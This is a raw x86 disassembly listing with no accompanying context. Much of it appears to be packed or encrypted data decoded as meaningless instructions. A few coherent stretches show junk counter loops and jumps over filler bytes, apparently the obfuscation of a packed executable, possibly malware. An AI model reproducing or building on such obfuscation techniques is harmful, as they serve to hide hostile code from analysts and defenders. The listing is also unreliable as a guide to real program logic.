  41968a:	mov    bh,0x85
  41968c:	mul    DWORD PTR ds:0x3e8c05e0
  419692:	inc    esi
  419693:	push   ss
  419694:	scas   al,BYTE PTR es:[edi]
  419695:	leave  
  419696:	pop    edx
  419697:	cmp    esi,ebp
  419699:	dec    edx
  41969a:	popa   
  41969b:	mov    ebp,0x19684298
  4196a0:	mov    dl,0x17
  4196a2:	dec    edx
  4196a3:	fsub   QWORD PTR [edi+0x48f36963]
  4196a9:	push   DWORD PTR [edx-0x499b7a75]
  4196af:	aam    0xba
  4196b1:	dec    edx
  4196b2:	push   es
  4196b3:	lds    eax,FWORD PTR [eax]
  4196b5:	jne    0x419705
  4196b7:	aam    0x60
  4196b9:	add    eax,0x98b2cce9
  4196be:	arpl   WORD PTR [edx-0x3b],bx
  4196c1:	fdivr  st,st(6)
  4196c3:	push   ebx
  4196c4:	lods   eax,DWORD PTR ds:[esi]
  4196c5:	and    DWORD PTR [edi+0x78262dc0],ebx
  4196cb:	add    ch,BYTE PTR [edx]
  4196cd:	sbb    DWORD PTR [ebx+ecx*4+0x5e2cd291],0x81c8abff
  4196d8:	and    al,dl
  4196da:	nop
  4196db:	call   0xf438e323
  4196e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196e1:	retf   0xd71a
  4196e4:	xor    al,0xc4
  4196e6:	sbb    BYTE PTR [ecx],dh
  4196e8:	or     eax,DWORD PTR [esi-0x20]
  4196eb:	es ret 
  4196ed:	push   0x17
  4196ef:	push   ss
  4196f0:	cld    
  4196f1:	repz mov ah,0xfd
  4196f4:	sub    al,0xcc
  4196f6:	or     eax,DWORD PTR [eax]
  4196f8:	popa   
  4196f9:	jne    0x4b0e7704
  4196ff:	sbb    al,0x44
  419701:	mov    ah,BYTE PTR [edi]
  419703:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419704:	cmp    al,0xf8
  419706:	bound  esi,QWORD PTR [eax]
  419708:	ror    DWORD PTR [eax],cl
  41970a:	pusha  
  41970b:	fsub   QWORD PTR [eax+0x18]
  41970e:	sub    bl,dl
  419710:	ss jg  0x41969a
  419713:	pop    ebp
  419714:	sbb    ch,BYTE PTR ds:0x6a3ca04e
  41971a:	inc    edx
  41971b:	fbstp  TBYTE PTR [esi]
  41971d:	sbb    al,0xb9
  41971f:	pop    ss
  419720:	in     al,dx
  419721:	into   
  419722:	mov    ds:0x8625a6dd,al
  419727:	in     al,dx
  419728:	test   eax,0x6307c7ad
  41972d:	fild   QWORD PTR [eax+0x3c]
  419730:	(bad)  
  419731:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419732:	push   esp
  419733:	xchg   ebp,eax
  419734:	call   0xc6bf89dc
  419739:	arpl   WORD PTR [edi-0x13],bp
  41973c:	(bad)  
  41973d:	push   ebx
  41973e:	cld    
  41973f:	retf   
  419740:	fnstcw WORD PTR [edx]
  419742:	mov    ebp,0xe73de8db
  419747:	ins    DWORD PTR es:[edi],dx
  419748:	jb     0x41978e
  41974a:	jmp    0x8b7a394c
  41974f:	dec    ebp
  419750:	adc    al,0x3
  419752:	test   BYTE PTR [ebx-0x1bb276f7],0xf
  419759:	scas   eax,DWORD PTR es:[edi]
  41975a:	shl    BYTE PTR [ebx],1
  41975c:	cmp    eax,0x42a801
  419761:	mov    ecx,0x4573
  419766:	add    edx,ecx
  419768:	sub    DWORD PTR ds:0x42a87d,ecx
  41976e:	mov    esi,0x7879
  419773:	mov    edi,0x1556
  419778:	not    DWORD PTR ds:0x42a845
  41977e:	xchg   esi,ecx
  419780:	add    DWORD PTR ds:0x42a7b5,0x585c
  41978a:	jmp    0x4199bf
  41978f:	iret   
  419790:	iret   
  419791:	(bad)  
  419792:	xlat   BYTE PTR ds:[ebx]
  419793:	(bad)  
  419794:	xlat   BYTE PTR ds:[ebx]
  419795:	iret   
  419796:	xlat   BYTE PTR ds:[ebx]
  419797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419798:	call   0x481addeb
  41979d:	mov    eax,cs
  41979f:	cmp    cl,cl
  4197a1:	jg     0x41981b
  4197a3:	adc    BYTE PTR [esi+0x78],bh
  4197a6:	js     0x4197a9
  4197a8:	jp     0x4197ee
  4197aa:	pusha  
  4197ab:	cli    
  4197ac:	ret    
  4197ad:	jmp    0x419746
  4197af:	mov    ah,0x51
  4197b1:	test   eax,0x81fa8521
  4197b6:	iret   
  4197b7:	lods   eax,DWORD PTR ds:[esi]
  4197b8:	mov    ecx,0x69247df3
  4197bd:	or     DWORD PTR [ebx+0x2263cbab],ecx
  4197c3:	sbb    ebx,DWORD PTR ds:0xfb8558e4
  4197c9:	scas   eax,DWORD PTR es:[edi]
  4197ca:	int3   
  4197cb:	lds    ecx,FWORD PTR [edi+edi*8-0x72dfde3a]
  4197d2:	add    al,0x99
  4197d4:	xor    al,0xd8
  4197d6:	ret    
  4197d7:	(bad)  
  4197da:	lock aam 0x82
  4197dd:	int3   
  4197de:	icebp  
  4197df:	sbb    eax,0xb1c3ab10
  4197e4:	(bad)  
  4197e5:	outs   dx,BYTE PTR ds:[esi]
  4197e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197e7:	push   ss
  4197e8:	das    
  4197e9:	or     DWORD PTR [ecx-0x4f],ecx
  4197ec:	outs   dx,DWORD PTR ds:[esi]
  4197ed:	push   ds
  4197ee:	(bad)  
  4197ef:	(bad)  
  4197f0:	call   0x73396d18
  4197f5:	mov    ebx,0x6ffef926
  4197fa:	sub    eax,0xd9861a55
  4197ff:	ret    0x6274
  419802:	pop    ds
  419803:	loop   0x4197d2
  419805:	call   0x4bff0dfb
  41980a:	mul    DWORD PTR [esi-0x5d]
  41980d:	dec    esp
  41980f:	mov    bl,0xb8
  419811:	mov    ecx,DWORD PTR es:[edx]
  419814:	fst    QWORD PTR [edi-0x11]
  419817:	data16 stc 
  419819:	fwait
  41981a:	mov    ds:0x75b8a4be,eax
  41981f:	xchg   edi,eax
  419820:	sub    BYTE PTR [eax-0x12],dl
  419823:	add    BYTE PTR [edx+0x16f0184d],dh
  419829:	mov    dl,0xae
  41982b:	and    DWORD PTR [edi],esi
  41982d:	ins    DWORD PTR es:[edi],dx
  41982e:	pop    ds
  41982f:	jecxz  0x419867
  419831:	pop    ecx
  419832:	popa   
  419833:	mov    ecx,0xd1980d00
  419838:	mov    esp,0xba1b3547
  41983d:	cmp    bh,ch
  41983f:	dec    ebp
  419840:	sub    dh,BYTE PTR [ecx]
  419842:	mov    al,0x9d
  419844:	mov    ebp,0xca00ea38
  419849:	cwde   
  41984a:	jle    0x41984a
  41984c:	xchg   esp,eax
  41984d:	jmp    0xedaa:0x63dbc642
  419854:	xlat   BYTE PTR ds:[ebx]
  419855:	cmp    eax,0xd0f57cc6
  41985a:	jecxz  0x419813
  41985c:	popa   
  41985d:	xchg   ebp,eax
  41985e:	jl     0x4198cd
  419860:	scas   al,BYTE PTR es:[edi]
  419861:	mov    ecx,0x9cc95862
  419866:	iret   
  419867:	mov    eax,ds:0x8c90cc83
  41986c:	or     eax,0x15db6a34
  419871:	and    BYTE PTR [ebx+0x2dc0ed2d],dl
  419877:	jg     0x419834
  419879:	jecxz  0x41984e
  41987b:	(bad)  [ebx+0x28]
  41987e:	shl    BYTE PTR [edi-0x48],1
  419881:	push   ss
  419882:	gs cmp eax,0x1c5decd2
  419888:	shr    BYTE PTR [ebx],cl
  41988a:	addr16 dec ebp
  41988c:	shl    BYTE PTR [edi],0x9b
  41988f:	mov    eax,0x68cc07b7
  419894:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419895:	xor    al,0x26
  419897:	clc    
  419898:	cli    
  419899:	mov    bl,0x4f
  41989b:	sbb    eax,0xbb1b4af6
  4198a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198a1:	test   edi,ebp
  4198a3:	fsubr  QWORD PTR [eax]
  4198a5:	pop    ecx
  4198a6:	shl    ebx,1
  4198a8:	int3   
  4198a9:	pop    esp
  4198aa:	push   edi
  4198ab:	xchg   ebx,eax
  4198ac:	cs call 0xc6baba60
  4198b2:	das    
  4198b3:	std    
  4198b4:	add    ecx,DWORD PTR [edx]
  4198b6:	mov    edx,0x653013ca
  4198bb:	sub    ch,cl
  4198bd:	xchg   edi,ebx
  4198bf:	retf   0x1405
  4198c2:	rol    DWORD PTR [ebp-0x29],0x20
  4198c6:	mov    ebp,0xf87cd222
  4198cb:	(bad)  
  4198cd:	in     al,dx
  4198ce:	xchg   ecx,ebp
  4198d0:	mov    al,0x64
  4198d2:	push   eax
  4198d3:	cs in  eax,dx
  4198d5:	loope  0x4198c2
  4198d7:	test   al,0xcf
  4198d9:	jg     0x4198ba
  4198db:	push   ds
  4198dc:	sub    bl,ch
  4198de:	or     al,0x73
  4198e0:	ins    DWORD PTR es:[edi],dx
  4198e1:	shr    DWORD PTR [edi-0xc],0x20
  4198e5:	mov    cl,0xc2
  4198e7:	mov    eax,0x9dbd1de6
  4198ec:	jle    0x4198a0
  4198ee:	jne    0x4198c5
  4198f0:	fnstenv [ebx-0x9aa5690]
  4198f6:	cli    
  4198f7:	les    edx,FWORD PTR [edi-0x363d37d4]
  4198fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198fe:	(bad)  
  4198ff:	test   al,0xf1
  419902:	cs ins DWORD PTR es:[edi],dx
  419904:	ds push ebp
  419906:	in     al,0x15
  419908:	(bad)  
  419909:	stc    
  41990a:	xor    al,0x55
  41990c:	aas    
  41990d:	retf   
  41990e:	dec    esp
  41990f:	xor    BYTE PTR [ecx+0x4a],bh
  419912:	bound  edi,QWORD PTR [edx+edx*2+0x78b47016]
  419919:	sbb    ecx,DWORD PTR [edi]
  41991b:	outs   dx,BYTE PTR ds:[esi]
  41991c:	std    
  41991d:	clc    
  41991e:	fdivrp st(1),st
  419920:	sub    eax,ecx
  419922:	add    ch,BYTE PTR [eax-0x25631d48]
  419928:	pop    eax
  419929:	mov    ch,0x22
  41992b:	or     eax,0x95081e26
  419930:	mov    dl,0x6c
  419932:	inc    esp
  419933:	xchg   BYTE PTR [ebp+ebx*4-0x5cbdb578],al
  41993a:	jmp    0x951e:0x6ea4553f
  419941:	sti    
  419942:	jle    0x419955
  419944:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419945:	dec    edi
  419946:	add    al,0xcf
  419948:	jb     0x419967
  41994a:	mov    esi,0xca0333ce
  41994f:	mov    esi,0xa54f675a
  419954:	out    0x58,eax
  419956:	jne    0x4199ba
  419958:	(bad)  
  419959:	ins    BYTE PTR es:[edi],dx
  41995a:	mov    ecx,0x91df8e56
  41995f:	int3   
  419960:	sbb    bh,BYTE PTR [edi+eax*2]
  419963:	out    0x22,al
  419965:	xchg   ebp,eax
  419966:	sub    BYTE PTR [edx+0x2a],dl
  419969:	jmp    0x5c81:0x273b41cf
  419970:	les    eax,FWORD PTR [ebx]
  419972:	jne    0x41990a
  419974:	add    ecx,ecx
  419976:	ins    DWORD PTR es:[edi],dx
  419977:	mov    ebp,0x6da318aa
  41997c:	xor    BYTE PTR [esi+ebp*1+0x2d4ff57e],dl
  419983:	cs stos DWORD PTR es:[edi],eax
  419985:	sub    BYTE PTR [edx-0x79],bh
  419988:	mov    al,ds:0x85475029
  41998d:	cs sahf 
  41998f:	ins    DWORD PTR es:[edi],dx
  419990:	sub    al,0x3c
  419992:	(bad)  
  419993:	jg     0x419995
  419995:	(bad)  
  419996:	cs jb  0x4199b0
  419999:	push   ecx
  41999a:	loop   0x41994e
  41999c:	adc    ch,ah
  41999e:	xor    bh,al
  4199a0:	call   0xf7a80bf
  4199a5:	popf   
  4199a6:	loope  0x4199c2
  4199a8:	out    dx,al
  4199a9:	neg    BYTE PTR [ebx+ebp*2+0x12]
  4199ad:	(bad)  
  4199ae:	es aaa 
  4199b0:	dec    ebp
  4199b1:	and    BYTE PTR [eax-0x3d1b3108],dl
  4199b7:	ins    DWORD PTR es:[edi],dx
  4199b8:	rcr    DWORD PTR [edi-0x1d],0x5
  4199bc:	shl    BYTE PTR [esi+0x4d],1
  4199bf:	sub    edx,edi
  4199c1:	adc    ecx,0x1fe4
  4199c7:	xor    esi,esi
  4199c9:	xor    DWORD PTR ds:0x42a80d,0x2675
  4199d3:	mov    DWORD PTR [ebp-0x28],esi
  4199d6:	mov    DWORD PTR ds:0x42a881,0x12
  4199e0:	cmp    DWORD PTR ds:0x42a881,0x0
  4199e7:	je     0x419a88
  4199ed:	cmp    DWORD PTR ds:0x42a881,0x16
  4199f4:	jne    0x419a15
  4199fa:	push   0x8ec2
  4199ff:	push   DWORD PTR [ebp-0x24]
  419a02:	push   0x4fb2
  419a07:	push   0x17f0
  419a0c:	push   DWORD PTR [ebp-0x20]
  419a0f:	call   DWORD PTR ds:0x41d11c
  419a15:	mov    ecx,DWORD PTR ds:0x42a881
  419a1b:	dec    ecx
  419a1c:	mov    DWORD PTR ds:0x42a881,ecx
  419a22:	jmp    0x4199e0
  419a27:	mov    DWORD PTR ds:0x42a765,0x1b
  419a31:	cmp    DWORD PTR ds:0x42a765,0x0
  419a38:	je     0x419a88
  419a3e:	cmp    DWORD PTR ds:0x42a765,0x5
  419a45:	jne    0x419a54
  419a4b:	push   DWORD PTR [ebp-0x14]
  419a4e:	call   DWORD PTR ds:0x41d1fc
  419a54:	cmp    DWORD PTR ds:0x42a765,0x6
  419a5b:	jne    0x419a6e
  419a61:	mov    ecx,DWORD PTR ds:0x42a765
  419a67:	dec    ecx
  419a68:	mov    DWORD PTR ds:0x42a765,ecx
  419a6e:	xor    ecx,ecx
  419a70:	or     ecx,DWORD PTR ds:0x42a765
  419a76:	dec    ecx
  419a77:	mov    DWORD PTR ds:0x42a765,ecx
  419a7d:	jmp    0x419a31
  419a82:	adc    DWORD PTR ds:0x42a805,ebx
  419a88:	mov    DWORD PTR [ebp-0x2c],esi
  419a8b:	and    DWORD PTR ds:0x42a849,ecx
  419a91:	mov    DWORD PTR [ebp-0x14],esi
  419a94:	add    ecx,DWORD PTR ds:0x42a7b5
  419a9a:	mov    DWORD PTR [ebp-0x8],esi
  419a9d:	mov    ecx,DWORD PTR [ebp-0x18]
  419aa0:	adc    DWORD PTR ds:0x42a83d,0x42a7b1
  419aaa:	xor    ecx,eax
  419aac:	xor    edi,edi
  419aae:	and    DWORD PTR ds:0x42a881,0x0
  419ab8:	jmp    0x419ac8
  419abd:	mov    eax,ds:0x42a881
  419ac2:	inc    eax
  419ac3:	mov    ds:0x42a881,eax
  419ac8:	cmp    DWORD PTR ds:0x42a881,0x1c
  419acf:	jae    0x419af8
  419ad5:	cmp    DWORD PTR ds:0x42a881,0x1e
  419adc:	jne    0x419aed
  419ae2:	push   0x42a805
  419ae7:	call   DWORD PTR ds:0x41d120
  419aed:	jmp    0x419abd
  419af2:	adc    eax,DWORD PTR ds:0x42a7cd
  419af8:	add    ecx,ebx
  419afa:	mov    DWORD PTR [ebp-0x20],ecx
  419afd:	mov    eax,ds:0x42a845
  419b02:	jmp    0x419d37
  419b07:	cmp    eax,0xcbcec3c5
  419b0c:	fcmovbe st,st(1)
  419b0e:	aad    0x68
  419b10:	xor    DWORD PTR [ecx+0xd],0x25
  419b14:	xor    bl,BYTE PTR [eax+0x2e]
  419b17:	ror    bh,1
  419b19:	jg     0x419b93
  419b1b:	adc    BYTE PTR [esi+0x78],bh
  419b1e:	js     0x419ab9
  419b20:	xchg   edx,eax
  419b21:	lock and BYTE PTR [edi+edx*4+0x2551868e],al
  419b29:	repz iret 
  419b2b:	mov    dh,BYTE PTR [ecx]
  419b2d:	inc    ecx
  419b2e:	aas    
  419b2f:	ds std 
  419b31:	and    eax,0x6546737
  419b36:	sbb    eax,0x40071d10
  419b3b:	mov    BYTE PTR [ebx+0x5],al
  419b3e:	sti    
  419b3f:	out    dx,eax
  419b40:	sbb    ch,bh
  419b42:	out    dx,al
  419b43:	test   eax,0xd35e0340
  419b48:	loopne 0x419b1b
  419b4a:	loope  0x419b5a
  419b4c:	cmp    dh,BYTE PTR [ebp+0x6b]
  419b4f:	dec    ebx
  419b50:	cmp    al,BYTE PTR ds:0x94fdd89e
  419b56:	jno    0x419bc2
  419b58:	mov    esp,0xb9b453a1
  419b5d:	sbb    ebx,esp
  419b5f:	jno    0x419b00
  419b61:	inc    BYTE PTR [ebx+ecx*8+0x4c]
  419b65:	stc    
  419b66:	sbb    dl,BYTE PTR [edi-0x1f2b171c]
  419b6c:	out    0xd0,al
  419b6e:	add    eax,0x85b5c5f7
  419b73:	dec    ecx
  419b74:	popf   
  419b75:	imul   eax,DWORD PTR [eax-0x2c],0xffffffbf
  419b79:	push   0x78e9cdc7
  419b7e:	aas    
  419b7f:	mov    ds:0x8a7f7501,eax
  419b84:	add    BYTE PTR ds:[ebp-0x53],dh
  419b88:	outs   dx,BYTE PTR ds:[esi]
  419b89:	mov    ebp,0x44b87ca6
  419b8e:	mov    bl,0x7e
  419b90:	aaa    
  419b91:	popf   
  419b92:	fstp   DWORD PTR [edx]
  419b94:	xor    BYTE PTR [ebx+0x2b],0x64
  419b98:	add    DWORD PTR [ebp+0x0],ecx
  419b9b:	ret    
  419b9c:	stos   BYTE PTR es:[edi],al
  419b9d:	sbb    BYTE PTR ds:[ebp+0x24],0x61
  419ba2:	jnp    0x419bb9
  419ba4:	in     eax,0xfc
  419ba6:	jns    0x419bb0
  419ba8:	out    dx,eax
  419ba9:	ret    0x3f12
  419bac:	ins    DWORD PTR es:[edi],dx
  419bad:	jne    0x419c17
  419baf:	push   0xffffffb0
  419bb1:	inc    ebp
  419bb2:	out    dx,al
  419bb3:	bound  ebx,QWORD PTR [ebp+edx*1+0x62fce316]
  419bba:	inc    edi
  419bbb:	add    eax,0xc7e17693
  419bc0:	cmp    al,0xba
  419bc2:	push   0xffffffa0
  419bc4:	add    edx,DWORD PTR [eax]
  419bc6:	lds    ebp,FWORD PTR [esi]
  419bc8:	cwde   
  419bc9:	sbb    al,0x5e
  419bcb:	inc    eax
  419bcc:	xchg   esi,eax
  419bcd:	mov    ch,al
  419bcf:	mov    es,WORD PTR [ebx+0x5ccec3ba]
  419bd5:	push   ss
  419bd6:	out    0x4b,eax
  419bd8:	adc    ecx,DWORD PTR [edi+edi*4-0x36]
  419bdc:	mov    bh,0xd4
  419bde:	lds    esp,FWORD PTR [edi+0x5c]
  419be1:	add    al,0x60
  419be3:	jle    0x419bfc
  419be5:	shl    BYTE PTR [ecx],0xc0
  419be8:	ds (bad) 
  419bea:	xor    al,0xc
  419bec:	xor    eax,0x49317993
  419bf1:	mov    al,0x84
  419bf3:	cli    
  419bf4:	out    dx,eax
  419bf5:	or     eax,0x14add261
  419bfa:	and    eax,0xfdc770d2
  419bff:	aam    0x3d
  419c01:	cmp    dl,dh
  419c03:	clc    
  419c04:	xor    al,0xaf
  419c06:	cli    
  419c07:	fiadd  DWORD PTR [ebx]
  419c09:	addr16 jle 0x419c06
  419c0c:	or     al,0x28
  419c0e:	mov    ebp,0xfa269f4f
  419c13:	repnz lock inc ebp
  419c16:	test   ebp,ecx
  419c18:	lods   eax,DWORD PTR ds:[esi]
  419c19:	push   cs
  419c1a:	add    eax,0x74b0b919
  419c1f:	cld    
  419c20:	push   es
  419c21:	pop    ecx
  419c22:	add    BYTE PTR [ebx-0x7f4f8f9d],dl
  419c28:	pop    esi
  419c29:	add    ebx,DWORD PTR [edx+0x7181a060]
  419c2f:	mov    es,WORD PTR [ecx]
  419c31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c32:	out    0x53,al
  419c34:	inc    ebx
  419c35:	(bad)  
  419c36:	xlat   BYTE PTR ds:[ebx]
  419c37:	loopne 0x419bc7
  419c39:	call   0xf3ad:0x78c6b5fb
  419c40:	lds    eax,FWORD PTR [edi+ecx*2]
  419c43:	xchg   edx,eax
  419c44:	push   0xffffffc0
  419c46:	cmp    DWORD PTR ds:[edi-0x4dd0d0ba],ebp
  419c4d:	pop    esp
  419c4e:	or     al,dl
  419c50:	push   es
  419c51:	mov    esp,0x4ad7efc0
  419c56:	jbe    0x419cc4
  419c58:	loopne 0x419c41
  419c5a:	pop    ds
  419c5b:	icebp  
  419c5c:	jnp    0x419c77
  419c5e:	push   eax
  419c5f:	adc    DWORD PTR [edx-0x9],eax
  419c62:	fisub  DWORD PTR [ebp+0x39]
  419c65:	mov    eax,esi
  419c67:	mov    DWORD PTR [ecx+0x7ebd7795],ebp
  419c6d:	dec    ebx
  419c6e:	lods   al,BYTE PTR ds:[esi]
  419c6f:	out    dx,eax
  419c70:	mov    ds:0xf8aa1809,eax
  419c75:	jmp    0x59c:0x8c1aee11
  419c7c:	jl     0x419cc6
  419c7e:	jge    0x419c93
  419c80:	(bad)  
  419c81:	cmp    BYTE PTR [esi],ah
  419c83:	xchg   esi,eax
  419c84:	xor    bh,BYTE PTR [ebx]
  419c86:	cmp    BYTE PTR [ecx+0x10f77fba],0x52
  419c8d:	das    
  419c8e:	add    ecx,DWORD PTR [edx]
  419c90:	(bad)  
  419c91:	jg     0x419cfb
  419c93:	(bad)  
  419c94:	ficomp WORD PTR [edi-0x58]
  419c97:	fnsave [ecx-0x28]
  419c9a:	sbb    DWORD PTR [esi-0x18bfc3d0],edi
  419ca0:	push   es
  419ca1:	push   es
  419ca2:	adc    al,0x2d
  419ca4:	pop    esi
  419ca5:	jmp    0x419ce1
  419ca7:	inc    edx
  419ca8:	nop
  419ca9:	mov    bl,0x65
  419cab:	sar    BYTE PTR [ecx],cl
  419cad:	xor    al,0xda
  419caf:	shl    BYTE PTR [edx+edx*4],cl
  419cb2:	ret    0x3d83
  419cb5:	cmp    al,0x58
  419cb7:	xchg   edi,eax
  419cb8:	or     BYTE PTR [ebx-0x3a8bfad0],bl
  419cbe:	fdiv   QWORD PTR [ebp+edi*2-0x38447f05]
  419cc5:	mov    ebx,0xcb6f7dfc
  419cca:	push   ebp
  419ccb:	jbe    0x419d3e
  419ccd:	sub    cl,BYTE PTR [esi-0x45f01698]
  419cd3:	lods   al,BYTE PTR ds:[esi]
  419cd4:	lods   eax,DWORD PTR ds:[esi]
  419cd5:	xor    eax,0xae6ad016
  419cda:	mov    edi,0x45d606c6
  419cdf:	outs   dx,BYTE PTR ds:[esi]
  419ce0:	cmp    edi,DWORD PTR [edi+0x371de374]
  419ce6:	rol    dl,0x21
  419ce9:	hlt    
  419cea:	and    DWORD PTR [eax-0x54],0x5
  419cee:	dec    esp
  419cef:	cli    
  419cf0:	or     DWORD PTR [ebx+esi*1-0x2e],ebx
  419cf4:	adc    DWORD PTR [edi+0x41],edx
  419cf7:	ja     0x419cd6
  419cf9:	sti    
  419cfa:	push   esp
  419cfb:	retf   0xe5d1
  419cfe:	sar    esi,0x13
  419d01:	stos   DWORD PTR es:[edi],eax
  419d02:	imul   esi,DWORD PTR [ebx+0x47],0x3df1768c
  419d09:	pop    es
  419d0a:	lods   al,BYTE PTR ds:[esi]
  419d0b:	add    ch,dh
  419d0d:	jno    0x419d6f
  419d0f:	add    al,0x2b
  419d11:	add    eax,DWORD PTR [edi]
  419d13:	jb     0x419d31
  419d15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d16:	push   ds
  419d17:	fcmovbe st,st(2)
  419d19:	push   ecx
  419d1a:	adc    edx,DWORD PTR [eax]
  419d1c:	inc    ebp
  419d1d:	sub    eax,0x6f3d5ced
  419d22:	xor    al,0x11
  419d24:	ds push es
  419d26:	retf   0x3689
  419d29:	mov    eax,ds:0xf47f1a01
  419d2e:	ret    0x9d37
  419d31:	mov    al,0x9d
  419d33:	pop    es
  419d34:	sti    
  419d35:	adc    eax,0xe0458b4a
  419d3a:	je     0x41a8c9
  419d40:	inc    eax
  419d41:	mov    eax,DWORD PTR [ebp-0x4]
  419d44:	xor    eax,0x7510850
  419d49:	sbb    DWORD PTR ds:0x42a839,0x42a76d
  419d53:	add    eax,ebx
  419d55:	mov    DWORD PTR ds:0x42a889,0x7077
  419d5f:	cmp    edi,eax
  419d61:	mov    DWORD PTR ds:0x42a83d,0xab2
  419d6b:	jmp    0x419fa0
  419d70:	(bad)  
  419d71:	into   
  419d72:	ror    bh,cl
  419d74:	(bad)  
  419d76:	leave  
  419d77:	(bad)  
  419d78:	push   0xffffffe9
  419d7a:	or     esi,esi
  419d7c:	mov    ch,0xe1
  419d7e:	ret    0xe8d9
  419d81:	int    0x7f
  419d83:	js     0x419d95
  419d85:	jle    0x419dff
  419d87:	js     0x419d97
  419d89:	(bad)  
  419d8a:	outs   dx,BYTE PTR ds:[esi]
  419d8b:	sbb    eax,0xa234ad5e
  419d90:	cmp    DWORD PTR [edx],eax
  419d92:	mov    bl,0xbe
  419d94:	mov    edx,DWORD PTR [ecx+0x1e018e5f]
  419d9a:	adc    BYTE PTR [ebp-0x35db9c3f],ah
  419da0:	call   0x6a57:0x950e28ae
  419da7:	fwait
  419da8:	lods   al,BYTE PTR ds:[esi]
  419daa:	lods   ax,WORD PTR ds:[esi]
  419dac:	jns    0x419db3
  419dae:	push   cs
  419daf:	mov    ecx,0x25198193
  419db4:	fbstp  TBYTE PTR [edx-0x6883f7b3]
  419dba:	sbb    bl,al
  419dbc:	add    edx,eax
  419dbe:	hlt    
  419dbf:	and    al,0x22
  419dc1:	sbb    DWORD PTR [esi],esi
  419dc3:	mov    ebp,0x5e43c073
  419dc8:	push   0x2e
  419dca:	retf   0x242d
  419dcd:	inc    ebx
  419dce:	adc    DWORD PTR [ebp-0x2add8b31],ebp
  419dd4:	jmp    0xc3a6:0x90bd7b2f
  419ddb:	test   eax,0xd68b564c
  419de0:	call   0xcd2d191b
  419de5:	scas   eax,DWORD PTR es:[edi]
  419de6:	push   es
  419de7:	jmp    0x419e32
  419de9:	xor    eax,0xe98b8733
  419dee:	or     al,0xcd
  419df0:	or     bh,BYTE PTR [esi]
  419df2:	into   
  419df3:	xchg   ebp,edi
  419df5:	mov    ebx,gs
  419df7:	xchg   edx,eax
  419df8:	bound  eax,QWORD PTR ds:[ecx]
  419dfb:	inc    edi
  419dfc:	pop    eax
  419dfd:	js     0x419dfe
  419dff:	int    0xab
  419e01:	pushf  
  419e02:	mov    eax,0x8673071c
  419e07:	test   al,0x68
  419e0a:	scas   eax,DWORD PTR es:[edi]
  419e0b:	mov    bl,0xa6
  419e0d:	xchg   esp,eax
  419e0e:	in     eax,0xf9
  419e10:	jp     0x419e57
  419e12:	retf   
  419e13:	sbb    al,0x99
  419e15:	sub    al,0x85
  419e17:	push   esi
  419e18:	cmp    DWORD PTR [ebp-0x231050e6],eax
  419e1e:	mov    cl,0xe8
  419e20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e21:	jle    0x419e29
  419e23:	lods   eax,DWORD PTR ds:[esi]
  419e24:	nop
  419e25:	ss pop ebp
  419e27:	sub    BYTE PTR ds:[edi],ch
  419e2a:	cwde   
  419e2b:	lahf   
  419e2c:	push   ds
  419e2d:	dec    ecx
  419e2e:	and    bh,BYTE PTR [ecx-0x34]
  419e31:	jb     0x419deb
  419e33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e34:	fsubr  st,st(4)
  419e36:	cmp    al,0x8c
  419e38:	cmp    dh,BYTE PTR [ebp+0x3c8d0246]
  419e3e:	adc    al,0xf9
  419e40:	xchg   ebx,eax
  419e41:	push   ds
  419e42:	mov    BYTE PTR [ebx],ah
  419e44:	hlt    
  419e45:	pushf  
  419e46:	ja     0x419eac
  419e48:	mov    edx,0x3fb78395
  419e4d:	xchg   BYTE PTR [ebp-0x58],bl
  419e50:	sub    al,0x8b
  419e52:	jecxz  0x419e86
  419e54:	xor    dl,BYTE PTR [edi]
  419e56:	retf   
  419e57:	clc    
  419e58:	sbb    BYTE PTR [edx-0x8696a3f],bh
  419e5e:	retf   0xa175
  419e61:	jno    0x419e00
  419e63:	and    edi,DWORD PTR [ebx+0x638033d4]
  419e69:	push   edx
  419e6a:	loopne 0x419e8c
  419e6c:	xchg   esi,eax
  419e6d:	sbb    eax,0x6092d858
  419e72:	adc    BYTE PTR [edx+edi*4-0x15ea6d82],0x64
  419e7a:	popa   
  419e7b:	xlat   BYTE PTR ds:[ebx]
  419e7c:	sub    BYTE PTR [eax+0x3],0x4a
  419e80:	push   esi
  419e81:	(bad)  
  419e82:	mov    eax,ds:0xa92f6566
  419e87:	push   eax
  419e88:	inc    eax
  419e89:	and    al,0x6a
  419e8b:	ret    
  419e8c:	gs xchg esi,eax
  419e8e:	popf   
  419e8f:	mov    bl,0xa7
  419e91:	or     dl,BYTE PTR [edi]
  419e93:	aas    
  419e94:	scas   al,BYTE PTR es:[edi]
  419e95:	fst    DWORD PTR [edx]
  419e97:	cwde   
  419e98:	cmp    BYTE PTR [eax+0xf],dh
  419e9b:	mov    eax,ds:0x8b012929
  419ea0:	xchg   esi,eax
  419ea1:	adc    edi,ebp
  419ea3:	lock int3 
  419ea5:	enter  0x9260,0x55
  419ea9:	dec    DWORD PTR [edi+ebp*8+0x16b8f1af]
  419eb0:	fnstenv [edi+0x142f7885]
  419eb6:	popf   
  419eb7:	sbb    al,0x68
  419eb9:	sbb    al,0xaf
  419ebb:	jg     0x419f2d
  419ebd:	mov    cs,eax
  419ebf:	pop    ss
  419ec0:	aad    0xa3
  419ec2:	imul   edi,DWORD PTR [edx+0x78ce296a],0x23
  419ec9:	sub    DWORD PTR [edi+0x2eab302d],ecx
  419ecf:	cmp    DWORD PTR [ecx+0x54],0x2b2d47d5
  419ed6:	aad    0x38
  419ed8:	sub    ecx,DWORD PTR [ecx+0x4c]
  419edb:	xchg   edi,eax
  419edc:	out    dx,eax
  419edd:	(bad)  
  419edf:	jae    0x419e84
  419ee1:	clc    
  419ee2:	jmp    0x533f:0xe3d95e3c
